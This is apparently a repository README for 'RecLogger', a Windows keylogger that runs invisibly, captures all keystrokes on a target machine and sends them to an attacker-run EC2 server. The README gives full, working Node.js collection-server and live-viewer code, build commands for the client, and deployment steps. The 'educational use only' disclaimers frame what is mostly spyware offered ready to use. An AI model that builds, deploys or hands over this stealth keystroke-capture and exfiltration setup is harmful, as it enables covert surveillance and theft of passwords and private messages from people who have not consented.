# RecLogger — Live Keystroke Capture & Broadcast (Educational Use Only)

## DISCLAIMER (READ FIRST)  
RecLogger is an educational and penetration testing tool designed to **capture keystrokes on a Windows system and transmit them securely to a remote server** for live monitoring.  
**This repository is provided for authorized use only.** Use RecLogger only on machines you own or have explicit, informed consent to monitor. Unauthorized use is illegal and unethical. The author is not responsible for misuse or damages.

---

## What RecLogger Does

- **Captures all keystrokes on a target Windows system** in real time using a compiled C++ executable (`demo.exe` or compiled from `main.cpp` with MSYS2/Mingw64).
- The client runs in the **background silently**, monitoring keyboard input and writing logs.
- Logs are POSTed continuously to a **Node.js/Express server** hosted on an AWS EC2 instance.
- The server appends the data to a log file (`server_log.txt`) and uses **WebSocket to broadcast live keystrokes** to connected browsers.
- Users can view the keystrokes in **real time** through a simple web interface (`index.html`).

---

## Technical Architecture

### Client (Windows)
- Written in C++ for efficient, low-level keyboard interception.
- Compiled using MSYS2 MinGW-w64 compiler.
- Runs as an executable that continuously captures keystrokes, outputs them locally, and transmits to the remote server.
- Runs invisibly in the background.

### Server (AWS EC2)
- Node.js Express server handles POST requests containing keystroke data.
- Appends logs with timestamps to a local file for persistence.
- Broadcasts real-time data to connected clients with WebSocket (`ws` module).
- Serves a minimal HTML/JavaScript frontend that shows live keystrokes.

### Frontend
- Simple HTML page connects via WebSocket to server.
- Displays streamed keystroke events live in a user-friendly list.

---

## Repository Structure

```
/server
  ├─ server.js        # Express server + WebSocket backend
  ├─ index.html       # Live keystroke display frontend
  └─ package.json     # Node.js dependencies

/client
  ├─ main.cpp        # C++ source for the keylogger client
  └─ demo.exe        # Precompiled executable for easy testing
```

---

## Prerequisites

### Windows Client (Compilation)

1. Install [MSYS2](https://www.msys2.org/).
2. Open MSYS2 MinGW 64-bit terminal.
3. Update packages and install compiler and curl libraries:

```bash
pacman -Syu
pacman -S mingw-w64-x86_64-toolchain mingw-w64-x86_64-curl
```

### AWS EC2 Server

1. Ubuntu instance recommended.
2. Open necessary TCP ports in EC2 security group (default: 3000).
3. Node.js (v18 recommended) and build-essential installed:

```bash
sudo apt update
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs build-essential
```

---

## Setup and Installation

### Server Setup on EC2

1. SSH into the EC2 instance:
```bash
ssh -i your_key.pem ubuntu@your-ec2-ip
```

2. Set up project & install Node.js dependencies:
```bash
mkdir rec-logger-server && cd rec-logger-server
npm init -y
npm install express body-parser ws cors
```

3. Create `server.js`:

```js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = 3000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

wss.on('connection', ws => {
  console.log('WS client connected');
  ws.send('Welcome to RecLogger server');
});

app.post('/upload', (req, res) => {
  const logContent = req.body.log;
  if (!logContent) return res.status(400).send('No log provided');

  wss.clients.forEach(client => {
    if (client.readyState === WebSocket.OPEN) client.send(logContent);
  });

  fs.appendFileSync('server_log.txt', new Date().toISOString() + ' - ' + logContent + '\n');

  res.send('OK');
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

server.listen(PORT, () => {
  console.log(`RecLogger server listening on port ${PORT}`);
});
```

4. Create `index.html`:

```html
<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>RecLogger - Live Keystrokes</title>
</head>
<body>
  <h1>Live Keystrokes from RecLogger</h1>
  <ul id="events"></ul>

  <script>
    const events = document.getElementById('events');
    const ws = new WebSocket('ws://' + location.hostname + ':3000');

    ws.onmessage = e => {
      const li = document.createElement('li');
      li.textContent = e.data;
      events.prepend(li);
    };
    ws.onopen = () => console.log('WebSocket connected');
    ws.onerror = err => console.error('WebSocket error', err);
  </script>
</body>
</html>
```

5. Run server:
```bash
node server.js
```

---

### Client Compilation & Run on Windows

1. Open MSYS2 MinGW 64-bit shell.
2. Navigate to the client directory:
```bash
cd /c/path/to/rec-logger/client
```
3. Edit `main.cpp` to replace placeholder `<EC2_IP>` with your EC2 public IP address.
4. Compile:
```bash
g++ main.cpp -o demo.exe -lcurl
```
5. Run executable:
```bash
./demo.exe
```

---

## Usage

- Start the server on EC2 (`node server.js`).
- Run the client executable on the target Windows machine.
- Open a web browser at `http://<EC2_PUBLIC_IP>:3000/` to watch live keystroke events.
- All keystrokes are saved to the server's `server_log.txt`.

---

## Ethical & Legal Considerations

- Use **only on systems you own or have explicit permission to test**.
- Unauthorized keylogging violates privacy laws and is punishable.
- The author disclaims liability for misuse or illegal deployment.
- Always comply with ethical standards and applicable laws.

---

## Contact & Support

Submit issues or questions through this repository's issue tracker.

---
